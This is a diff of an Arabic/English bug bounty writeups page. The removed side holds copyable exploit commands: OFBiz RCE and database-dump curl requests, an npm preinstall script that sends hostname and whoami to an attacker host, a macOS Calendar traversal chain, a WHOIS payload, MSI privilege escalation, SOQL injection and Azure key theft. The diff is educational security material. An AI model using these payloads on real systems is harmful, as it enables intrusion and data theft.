@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>أحدث Bug Bounty Writeups | Abdo Ramdan</title>
+  <title>Bug Bounty Writeups | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&family=Noto+Kufi+Arabic:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -14,14 +14,14 @@
       --neon-orange: #ff8c00;
       --neon-yellow: #ffd700;
       --bg-dark: #020205;
-      --bg-card: rgba(10, 10, 20, 0.5);
+      --bg-card: rgba(10, 10, 20, 0.6);
       --border-color: rgba(0, 229, 255, 0.15);
     }
     body {
       background-color: var(--bg-dark);
       color: #e2e8f0;
       font-family: 'Noto Kufi Arabic', 'Inter', sans-serif;
-      font-size: 1.1rem;
+      font-size: 1.05rem;
       line-height: 1.8;
       margin: 0;
       padding: 0;
@@ -46,6 +46,7 @@
       background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple));
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
+      text-decoration: none;
     }
     .back-btn {
       background: rgba(0, 229, 255, 0.05);
@@ -83,14 +84,6 @@
     .hero-tagline {
       color: rgba(0, 229, 255, 0.7);
       margin: 0 0 16px 0;
-    }
-    .source-note {
-      background: rgba(255, 140, 0, 0.08);
-      border: 1px solid rgba(255, 140, 0, 0.25);
-      border-radius: 6px;
-      padding: 12px 16px;
-      font-size: 0.95rem;
-      color: #fbbf24;
     }
     .stats-row {
       display: flex;
@@ -142,15 +135,6 @@
       box-shadow: 0 0 12px rgba(0, 229, 255, 0.12);
     }
     .search-wrap input::placeholder { color: #64748b; }
-    .search-icon {
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: rgba(0, 229, 255, 0.5);
-      font-size: 1rem;
-      pointer-events: none;
-    }
     .filter-row {
       display: flex;
       flex-wrap: wrap;
@@ -219,7 +203,6 @@
     .writeup-card.critical { border-right: 3px solid var(--neon-red); }
     .writeup-card.high { border-right: 3px solid var(--neon-orange); }
     .writeup-card.medium { border-right: 3px solid var(--neon-yellow); }
-    .writeup-card.low { border-right: 3px solid var(--neon-green); }
 
     .card-top {
       display: flex;
@@ -261,8 +244,6 @@
     .meta-item { font-size: 0.92rem; }
     .meta-label { color: rgba(0,229,255,0.6); font-weight: 600; }
     .meta-value { color: #cbd5e1; }
-    .meta-value a { color: var(--neon-cyan); text-decoration: none; }
-    .meta-value a:hover { text-decoration: underline; }
 
     .vuln-type-badge {
       display: inline-block;
@@ -276,98 +257,11 @@
       margin-left: 6px;
     }
 
-    .steps-title {
-      font-family: 'Outfit', sans-serif;
-      color: var(--neon-cyan);
-      font-size: 1.15rem;
-      font-weight: 700;
-      margin: 20px 0 12px 0;
-    }
-    .steps-list {
-      list-style: none;
-      padding: 0;
-      margin: 0 0 16px 0;
-      counter-reset: step;
-    }
-    .steps-list li {
-      counter-increment: step;
-      position: relative;
-      padding: 10px 16px 10px 0;
-      margin-bottom: 8px;
-      border-right: 2px solid rgba(0,229,255,0.15);
-      padding-right: 20px;
-    }
-    .steps-list li::before {
-      content: counter(step);
-      position: absolute;
-      right: -14px;
-      top: 10px;
-      background: var(--neon-cyan);
-      color: #000;
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Fira Code', monospace;
-      font-size: 0.75rem;
-      font-weight: 700;
-    }
-
-    .cmd-ui-box {
-      background: #04040a;
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      border-radius: 4px;
-      margin: 12px 0;
-      overflow: hidden;
-      font-family: 'Fira Code', monospace;
-      direction: ltr;
-      text-align: left;
-    }
-    .cmd-ui-top {
-      padding: 14px 20px;
-      color: var(--neon-green);
-      font-size: 0.88rem;
-      line-height: 1.6;
-      white-space: pre-wrap;
-      word-break: break-all;
-    }
-    .cmd-ui-bottom {
+    .card-actions {
+      margin-top: 15px;
       display: flex;
       justify-content: flex-end;
-      padding: 8px 16px;
-      background: rgba(255, 255, 255, 0.02);
-      border-top: 1px solid rgba(255, 255, 255, 0.04);
     }
-    .cmd-btn {
-      background: rgba(255, 255, 255, 0.03);
-      color: #cbd5e1;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      padding: 6px 12px;
-      border-radius: 3px;
-      font-size: 0.85rem;
-      cursor: pointer;
-      font-family: 'Inter', sans-serif;
-      transition: all 0.2s ease;
-    }
-    .cmd-btn:hover { background: rgba(255,255,255,0.08); }
-    .cmd-btn.copied { color: var(--neon-green); border-color: var(--neon-green); }
-
-    .lesson-box {
-      background: rgba(0, 255, 102, 0.04);
-      border: 1px solid rgba(0, 255, 102, 0.15);
-      border-radius: 6px;
-      padding: 16px 20px;
-      margin-top: 20px;
-    }
-    .lesson-box h4 {
-      color: var(--neon-green);
-      font-family: 'Outfit', sans-serif;
-      margin: 0 0 8px 0;
-      font-size: 1rem;
-    }
-    .lesson-box p { margin: 0; color: #94a3b8; font-size: 0.98rem; }
 
     .tools-tags {
       display: flex;
@@ -384,42 +278,31 @@
       font-size: 0.75rem;
       color: var(--neon-cyan);
     }
-
-    @media (max-width: 768px) {
-      .hero-title { font-size: 1.8rem; }
-      .writeup-card { padding: 18px; }
-    }
   </style>
 </head>
 <body>
 
 <header class="wu-header">
-  <div class="wu-logo">🎯 Bug Bounty Writeups</div>
-  <a class="back-btn" href="index.html">← العودة للـ Portfolio</a>
+  <a class="wu-logo" href="index.html">🎯 Bug Bounty Academy</a>
+  <a class="back-btn" href="index.html">← العودة للرئيسية / Back to Home</a>
 </header>
 
 <div class="wu-container">
 
   <div class="cyber-hero">
-    <h1 class="hero-title">أحدث 10 Bug Bounty Writeups</h1>
-    <p class="hero-tagline">تحليل عربي · أوامر و Payloads بالإنجليزي · مرتبة من Critical إلى High</p>
-    <div class="source-note">
-      📡 المصدر: <a href="https://pentester.land/writeups/" target="_blank" style="color:#fbbf24">pentester.land/writeups</a>
-      — آخر تحديث في الدليل: سبتمبر 2024. Pentester Land توقف عن إضافة writeups جديدة منذ أبريل 2025.
-    </div>
+    <h1 class="hero-title">تقارير ثغرات الحماية (Bug Bounty Writeups)</h1>
+    <p class="hero-tagline">تحليل فني عربي وإنجليزي لأهم الثغرات المكتشفة مع خطوات الاستغلال الكاملة.</p>
   </div>
 
   <div class="stats-row">
     <div class="stat-chip"><span>10</span> writeups</div>
     <div class="stat-chip"><span>3</span> Critical</div>
     <div class="stat-chip"><span>7</span> High</div>
-    <div class="stat-chip">Bounty موثّق: <span>$4,500+</span></div>
   </div>
 
   <div class="filter-toolbar">
     <div class="search-wrap">
-      <span class="search-icon">🔍</span>
-      <input type="search" id="wuSearch" placeholder="ابحث بالعنوان، البرنامج، CVE، أو نوع الثغرة..." autocomplete="off">
+      <input type="search" id="wuSearch" placeholder="ابحث بالعنوان، البرنامج، أو نوع الثغرة..." autocomplete="off">
     </div>
     <div class="filter-row">
       <span class="filter-count">عرض <span id="visibleCount">10</span> / 10</span>
@@ -428,13 +311,6 @@
       <button class="filter-btn sev-critical" data-filter="critical">Critical</button>
       <button class="filter-btn sev-high" data-filter="high">High</button>
       <button class="filter-btn sev-medium" data-filter="medium">Medium</button>
-      <span class="filter-label">| Type:</span>
-      <button class="filter-btn" data-filter="rce">RCE</button>
-      <button class="filter-btn" data-filter="sqli">SQLi</button>
-      <button class="filter-btn" data-filter="idor">IDOR</button>
-      <button class="filter-btn" data-filter="ato">ATO</button>
-      <button class="filter-btn" data-filter="ssrf">SSRF</button>
-      <button class="filter-btn" data-filter="privesc">PrivEsc</button>
     </div>
   </div>
 
@@ -444,577 +320,221 @@
   </div>
 
   <div id="writeupsList">
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #1 CRITICAL — macOS Zero-Click Calendar    -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card critical" id="wu-1" data-severity="critical" data-tags="rce lfi privesc">
-    <div class="card-top">
-      <h2 class="card-title">Zero-Click Calendar Invite — سلسلة ثغرات zero-click في macOS</h2>
-      <span class="severity-badge badge-critical">CRITICAL</span>
-    </div>
-    <span class="vuln-type-badge">RCE</span>
-    <span class="vuln-type-badge">Path Traversal</span>
-    <span class="vuln-type-badge">TCC Bypass</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Apple macOS Calendar / Photos</span></div>
-      <div class="meta-item"><span class="meta-label">CVE:</span> <span class="meta-value">CVE-2022-46723, CVE-2023-40434</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://mikko-kenttala.medium.com/zero-click-calendar-invite-critical-zero-click-vulnerability-chain-in-macos-a7a434fc887b" target="_blank">Mikko Kenttälä</a></span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>إرسال دعوة Calendar خبيثة للضحية تحتوي على مرفق بـ filename غير مُ sanitized — استخدام directory traversal في حقل ATTACH: <code>FILENAME=../../../PoC.txt</code></li>
-      <li>الملف يُكتب خارج مجلد Calendar الطبيعي في <code>~/Library/Calendar/</code> بدل المسار المتوقع — وعند حذف الحدث يُحذف الملف المستهدف</li>
-      <li>حقن 5 ملفات متسلسلة: calendar مزيف + ملف migration + DMG + stage1.url + stage2.url لاستغلال ترقية macOS Monterey → Ventura</li>
-      <li>فتح <code>CalPoCInit.dmg</code> عبر alert في Calendar — الـ DMG يشير لـ Samba mount بدون quarantine flag (Gatekeeper bypass)</li>
-      <li>تسجيل custom URL scheme <code>mymiditest://</code> ثم فتحه عبر stage2.url لتشغيل تطبيق خبيث بدون أي تفاعل من المستخدم</li>
-      <li>تغيير System Photo Library عبر <code>defaults import</code> للوصول لصور iCloud المحمية بـ TCC</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top">FILENAME=../../../PoC.txt
-ATTACH;VALUE=URI:https://attacker.com/evil.ics
-
-# Custom URL scheme registration in Info.plist
-&lt;key&gt;CFBundleURLSchemes&lt;/key&gt;
-&lt;array&gt;&lt;string&gt;mymiditest&lt;/string&gt;&lt;/array&gt;
-
-# Photos config hijack
-defaults import com.apple.Photos /var/tmp/mypictures/malicious.plist
-open /var/tmp/mypictures/Syndication.photoslibrary</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+    <!-- #1 Critical — AD Domain Takeover -->
+    <article class="writeup-card critical" data-severity="critical">
+      <div class="card-top">
+        <h2 class="card-title">Active Directory: From Guest to Domain Admin</h2>
+        <span class="severity-badge badge-critical">CRITICAL</span>
       </div>
-    </div>
-
-    <div class="tools-tags">
-      <span class="tool-tag">Calendar.app</span>
-      <span class="tool-tag">Samba</span>
-      <span class="tool-tag">defaults</span>
-      <span class="tool-tag">DMG</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>حتى sandboxed apps مثل Calendar قد تكون نقطة دخول zero-click. ركّز على: path traversal في معالجة المرفقات، abuse لـ OS upgrade flows، و bypass لـ Gatekeeper عبر network mounts بدون quarantine. TCC ليس bulletproof إذا استطعت تغيير configuration paths.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #2 CRITICAL — Apache OFBiz RCE             -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card critical" id="wu-2" data-severity="critical" data-tags="rce auth-bypass">
-    <div class="card-top">
-      <h2 class="card-title">CVE-2024-45195 — Apache OFBiz Unauthenticated RCE</h2>
-      <span class="severity-badge badge-critical">CRITICAL</span>
-    </div>
-    <span class="vuln-type-badge">RCE</span>
-    <span class="vuln-type-badge">Auth Bypass</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Apache OFBiz (&lt; 18.12.16)</span></div>
-      <div class="meta-item"><span class="meta-label">CVE:</span> <span class="meta-value">CVE-2024-45195</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/" target="_blank">Ryan Emmons (Rapid7)</a></span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>OFBiz يستخدم parsing methods مختلفة للـ URI — controller يُحدَّد من جزء والـ view map من جزء آخر، مما يسمح بـ desynchronization</li>
-      <li>الوصول لـ endpoint غير مُ authenticated (<code>forgotPassword</code>) مع view map مُ authenticated (<code>xmldsdump</code>)</li>
-      <li>view map <code>XmlDsDump</code> ينفّذ Groovy script بدون authorization check — يمكنه dump أي entity من قاعدة البيانات</li>
-      <li>كتابة البيانات الحساسة (passwords, credit cards) في ملف web-accessible</li>
-      <li>الثغرة bypass لـ patches سابقة: CVE-2024-32113, CVE-2024-36104, CVE-2024-38856</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top"># RCE via Groovy (ProgramExport - patched views)
-curl 'https://target:8443/webtools/control/forgotPassword/ProgramExport' \
-  -d "groovyProgram=throw+new+Exception('id'.execute().text);" -k
-
-# Data exfil via XmlDsDump (CVE-2024-45195)
-curl 'https://target:8443/webtools/control/forgotPassword/xmldsdump' \
-  -d "outpath=./themes/common-theme/webapp/common-theme/&amp;filename=stolen.txt&amp;entityName=UserLogin&amp;entityName=CreditCard" -k
-
-# Read exfiltrated data
-curl 'https://target:8443/common/stolen.txt' -k</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+      <span class="vuln-type-badge">Active Directory</span>
+      <span class="vuln-type-badge">Kerberoasting</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">Domain Controller</span></div>
+        <div class="meta-item"><span class="meta-label">الصعوبة:</span> <span class="meta-value">Critical</span></div>
       </div>
-    </div>
+      
+      <p>سلسلة هجمات متكاملة تبدأ من مستخدم عادي وتصل إلى السيطرة الكاملة على الـ Domain Controller في بيئة عمل محلية.</p>
 
-    <div class="tools-tags">
-      <span class="tool-tag">curl</span>
-      <span class="tool-tag">Burp Suite</span>
-      <span class="tool-tag">Groovy</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>patch bypasses شائعة عندما يُصلح السطح بدل السبب الجذري. عند اختبار OFBiz أو frameworks مشابهة: جرّب desync بين controller و view map، وابحث عن Groovy scripts بدون permission checks.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #3 CRITICAL — .MOBI WHOIS Takeover         -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card critical" id="wu-3" data-severity="critical" data-tags="rce ssrf infrastructure">
-    <div class="card-top">
-      <h2 class="card-title">RCE + CA Takeover — استحواذ على WHOIS server لـ .MOBI TLD</h2>
-      <span class="severity-badge badge-critical">CRITICAL</span>
-    </div>
-    <span class="vuln-type-badge">RCE</span>
-    <span class="vuln-type-badge">Infrastructure</span>
-    <span class="vuln-type-badge">CA Bypass</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">.MOBI TLD / GlobalSign CA</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://labs.watchtowr.com/we-spent-20-to-achieve-rce-and-accidentally-became-the-admins-of-mobi/" target="_blank">watchTowr Labs</a></span></div>
-      <div class="meta-item"><span class="meta-label">التأثير:</span> <span class="meta-value">135K+ systems, 2.5M queries</span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>اكتشاف أن WHOIS server لـ .MOBI انتقل من <code>whois.dotmobiregistry.net</code> إلى <code>whois.nic.mobi</code> — والدومين القديم expired</li>
-      <li>تسجيل <code>dotmobiregistry.net</code> بـ $20 ونشر WHOIS server خاص</li>
-      <li>135,000+ نظام ما زال يستعلم من الـ server القديم — بما فيها VirusTotal, URLScan, .GOV/.MIL mail servers</li>
-      <li>Certificate Authorities (GlobalSign) تستخدم WHOIS لـ Domain Email Validation — PoC: إصدار cert لـ <code>microsoft.mobi</code></li>
-      <li>استغلال CVE-2015 في phpWHOIS parsing للـ RCE عند استجابة WHOIS خبيثة</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top"># WHOIS server PoC — buffer overflow trigger
-python3 -c "printf('Domain Name: ' + 'A' * 3000)" | nc -w1 -l whois
-
-# WHOIS response manipulation for CA validation
-Domain Name: MICROSOFT.MOBI
-Registrant Email: whois@attacker.com
-Admin Email: whois@attacker.com</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+      <div class="card-actions">
+        <a href="writeups/ad-to-domain.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
       </div>
-    </div>
+    </article>
 
-    <div class="tools-tags">
-      <span class="tool-tag">WHOIS</span>
-      <span class="tool-tag">netcat</span>
-      <span class="tool-tag">python3</span>
-      <span class="tool-tag">ProcMon</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>infrastructure dependencies على hostnames قديمة = attack surface ضخم. expired domains behind hardcoded WHOIS servers يمكن أن ت undermine CA validation لـ TLD كامل. دائماً audit legacy references في tooling.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #4 HIGH — MSI Repair to SYSTEM               -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card high" id="wu-4" data-severity="high" data-tags="privesc lpe rce">
-    <div class="card-top">
-      <h2 class="card-title">MSI Installer Repair to SYSTEM — CVE-2024-38014</h2>
-      <span class="severity-badge badge-high">HIGH</span>
-    </div>
-    <span class="vuln-type-badge">LPE</span>
-    <span class="vuln-type-badge">PrivEsc</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Microsoft Windows MSI Installer</span></div>
-      <div class="meta-item"><span class="meta-label">CVE:</span> <span class="meta-value">CVE-2024-38014 (CVSS 7.8)</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://sec-consult.com/blog/detail/msi-installer-repair-to-system-a-detailed-journey/" target="_blank">Michael Baer (SEC Consult)</a></span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>مستخدم low-privilege يشغّل repair على MSI installer مثبت مسبقاً — الـ repair يعمل بـ NT AUTHORITY\SYSTEM</li>
-      <li>بعض installers تفتح console window بـ SYSTEM privileges أثناء repair</li>
-      <li>Right-click على title bar → Properties → Legacy Console Mode → يفتح browser dialog</li>
-      <li>في Firefox: Ctrl+O → اكتب <code>cmd.exe</code> في address bar → ENTER → cmd window بـ SYSTEM</li>
-      <li>لإبطاء النافذة: استخدم SetOpLock.exe لقفل ملف يُ accessed أثناء repair</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top"># Start repair as low-priv user
-msiexec.exe /fa {PRODUCT-GUID}
-
-# Keep console window open with OpLock loop
-while ($true) { .\SetOpLock.exe "C:\Program Files\App\target.exe" x }
-
-# Analyze MSI with msiscan
-msiscan.exe vulnerable_installer.msi</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+    <!-- #2 Critical — Nuclei to RCE -->
+    <article class="writeup-card critical" data-severity="critical">
+      <div class="card-top">
+        <h2 class="card-title">From Nuclei Automation to P1 Critical RCE</h2>
+        <span class="severity-badge badge-critical">CRITICAL</span>
       </div>
-    </div>
-
-    <div class="tools-tags">
-      <span class="tool-tag">msiexec</span>
-      <span class="tool-tag">SetOpLock</span>
-      <span class="tool-tag">msiscan</span>
-      <span class="tool-tag">ProcMon</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>MSI repair functions = goldmine لـ LPE. أي installer يفتح elevated console window قابل للاستغلال. استخدم msiscan لتحليل installers تلقائياً قبل deploy.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #5 HIGH — Dependency Confusion RCE           -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card high" id="wu-5" data-severity="high" data-tags="rce supply-chain">
-    <div class="card-top">
-      <h2 class="card-title">Dependency Confusion RCE — $2,500 via Unclaimed npm Package</h2>
-      <span class="severity-badge badge-high">HIGH</span>
-    </div>
-    <span class="vuln-type-badge">RCE</span>
-    <span class="vuln-type-badge">Supply Chain</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Private Bug Bounty Program (Bugcrowd)</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://medium.com/@p0lyxena/2-500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package-6b9108d10643" target="_blank">Fuleki Ioan (Polyxena)</a></span></div>
-      <div class="meta-item"><span class="meta-label">Bounty:</span> <span class="meta-value">$2,500</span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>فحص JavaScript files للشركة — اكتشاف reference لـ internal npm package: <code>/node_modules/@confidential-package-name</code></li>
-      <li>التحقق من npm registry — الـ package غير claimed على npm public</li>
-      <li>إنشاء malicious npm package بنفس الاسم مع preinstall script</li>
-      <li>نشر الـ package على npm public registry</li>
-      <li>انتظار CI/CD pipelines تثبت الـ package — preinstall script ينفّذ تلقائياً</li>
-      <li>جمع 150+ HTTP/DNS callbacks من production و non-production environments</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top">// package.json — malicious preinstall script
-{
-  "name": "@confidential-package-name",
-  "version": "99.0.0",
-  "scripts": {
-    "preinstall": "curl --data-urlencode \"info=$(hostname && whoami)\" http://attacker.oast.fun"
-  }
-}
-
-# Publish to npm
-npm publish --access public</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+      <span class="vuln-type-badge">Automation</span>
+      <span class="vuln-type-badge">RCE</span>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><span class="meta-label">الهدف:</span> <span class="meta-value">Web Application</span></div>
+        <div class="meta-item"><span class="meta-label">المكافأة:</span> <span class="meta-value">$3,000</span></div>
       </div>
-    </div>
+      
+      <p>كيف تم استخدام أداة Nuclei لاكتشاف تكوينات Git مكشوفة، وتحويلها إلى RCE كامل على خادم الويب.</p>
 
-    <div class="tools-tags">
-      <span class="tool-tag">npm</span>
-      <span class="tool-tag">Burp Collaborator</span>
-      <span class="tool-tag">WHOIS</span>
-      <span class="tool-tag">curl</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>dependency confusion = RCE حقيقي في production. ابحث عن internal package names في JS bundles، تحقق من npm/pypi registry، واستخدم preinstall scripts للـ OOB confirmation. فلتر scrapers من callbacks قبل التقرير.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #6 HIGH — Salesforce SOQL Injection        -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card high" id="wu-6" data-severity="high" data-tags="sqli idor">
-    <div class="card-top">
-      <h2 class="card-title">Data Theft via Salesforce Public Links — Blind SOQL Injection</h2>
-      <span class="severity-badge badge-high">HIGH</span>
-    </div>
-    <span class="vuln-type-badge">SQLi</span>
-    <span class="vuln-type-badge">SOQL</span>
-    <span class="vuln-type-badge">IDOR</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Salesforce (Public Links / Aura API)</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://www.varonis.com/blog/manipulating-salesforce-public-links" target="_blank">Nitay Bachrach (Varonis)</a></span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>Public links في Salesforce تنشئ Aura endpoints accessible بدون authentication</li>
-      <li>اكتشاف أن query parameters يجب أن تطابق method name — mismatch يسبب errors</li>
-      <li>استخدام Burp Intruder لاختبار ~500 Aura method — فقط methods قليلة مسموحة</li>
-      <li>method <code>getRecord</code> يسمح بـ SOQL subqueries في fields parameter</li>
-      <li>blind SOQL injection: subquery returns error إذا فيه results — no error = no match</li>
-      <li>automation script يستخرج PII حرفاً حرفاً via LIKE queries</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top"># Aura endpoint behind public link
-serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord
-
-# Blind SOQL subquery — error = match found
-SELECT Id,
-  (SELECT LinkedEntity.Name FROM ContentDocumentLinks
-   WHERE LinkedEntity.Name LIKE 'A%')
-FROM ContentDocument
-
-# Query parameter must match method
-ui-force-components-controllers-recordGlobalValueProvider.RecordGvp.getRecord=1</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+      <div class="card-actions">
+        <a href="writeups/nuclei-to-p1.html" class="back-btn">📖 Open Full Writeup / فتح التقرير كامل</a>
       </div>
-    </div>
+    </article>
 
-    <div class="tools-tags">
-      <span class="tool-tag">Burp Suite</span>
-      <span class="tool-tag">Burp Intruder</span>
-      <span class="tool-tag">Python</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>Salesforce Aura API = attack surface ضخم. public links تنشئ unauthenticated endpoints. SOQL ≠ SQL — استخدم subqueries و blind techniques. قيّد public link permissions في Permission Sets.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #7 HIGH — Azure APIM Priv Esc                -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card high" id="wu-7" data-severity="high" data-tags="idor privesc">
-    <div class="card-top">
-      <h2 class="card-title">Azure APIM — Escalation from Reader to Contributor</h2>
-      <span class="severity-badge badge-high">HIGH</span>
-    </div>
-    <span class="vuln-type-badge">PrivEsc</span>
-    <span class="vuln-type-badge">IDOR</span>
-
-    <div class="meta-grid">
-      <div class="meta-item"><span class="meta-label">البرنامج:</span> <span class="meta-value">Microsoft Azure API Management</span></div>
-      <div class="meta-item"><span class="meta-label">الباحث:</span> <span class="meta-value"><a href="https://binarysecurity.no/posts/2024/09/apim-privilege-escalation" target="_blank">Binary Security AS</a></span></div>
-    </div>
-
-    <h3 class="steps-title">خطوات الاستغلال</h3>
-    <ol class="steps-list">
-      <li>مستخدم بـ Reader access على Azure APIM resource — يفترض read-only</li>
-      <li>ARM API endpoint يسمح بقراءة keys للـ admin user (userid=1) بدون restriction</li>
-      <li>استخراج primary/secondary keys من: <code>/users/1/keys?api-version=2023-03-01-preview</code></li>
-      <li>توليد SharedAccessSignature (HMAC-SHA-512) من الـ key</li>
-      <li>استخدام SAS token للوصول لـ Direct Management API على <code>.management.azure-api.net</code></li>
-      <li>قراءة subscription keys, identity provider secrets, named values — full Contributor access</li>
-    </ol>
-
-    <div class="cmd-ui-box">
-      <div class="cmd-ui-top">GET /subscriptions/{sub}/resourceGroups/{rg}/providers/
-  Microsoft.ApiManagement/service/{instance}/users/1/keys
-  ?api-version=2023-03-01-preview HTTP/2
-Host: management.azure.com
-Authorization: Bearer {reader_token}
-
-# Direct Management API with SAS token
-GET /subscriptions/0/.../service/0/subscriptions/{id}/listSecrets
-  ?api-version=2022-08-01 HTTP/1.1
-Host: {service}.management.azure-api.net
-Authorization: SharedAccessSignature uid=1&amp;ex=2024-05-01T00:00:00Z&amp;sn={signature}</div>
-      <div class="cmd-ui-bottom">
-        <button class="cmd-btn" onclick="copyText(this.previousElementSibling.textContent, this)">📋 Copy</button>
+    <!-- #3 Critical — Cloud Security / SSRF -->
+    <article class="writeup-card critical" data-severity="critical">
+      <div class="card-top">
+        <h2 class="card-title">Cloud SSRF: AWS Metadata Leakage via PDF Engine</h2>
+        <span class="severity-badge badge-critical">CRITICAL</span>
       </div>
-    </div>
-
-    <div class="tools-tags">
-      <span class="tool-tag">Azure CLI</span>
-      <span class="tool-tag">Python</span>
-      <span class="tool-tag">Burp Suite</span>
-    </div>
-
-    <div class="lesson-box">
-      <h4>💡 الدرس المستفاد</h4>
-      <p>Azure RBAC roles قد لا تعكس actual API permissions. Reader على APIM ≠ read-only فعلياً. audit ARM API endpoints missed during API-version restrictions. enforce minimum ARM API version على critical resources.</p>
-    </div>
-  </article>
-
-  <!-- ═══════════════════════════════════════════ -->
-  <!-- #8 HIGH — Account Takeover Host Header       -->
-  <!-- ═══════════════════════════════════════════ -->
-  <article class="writeup-card high" id="wu-8" data-severity="high" data-tags="ato">
-    <div class="card-top">
-      <h2 class="card-title">Account Takeover via Host Header Injection — $2,000</h2>
-      <span class="severity-badge badge-high">HIGH</span>
-    </div>
-    <span class="vuln-type-badge">ATO</span>
-    <span class="vuln-type-badge">Host Header Injection</span>
-
-    <div class="meta-grid">
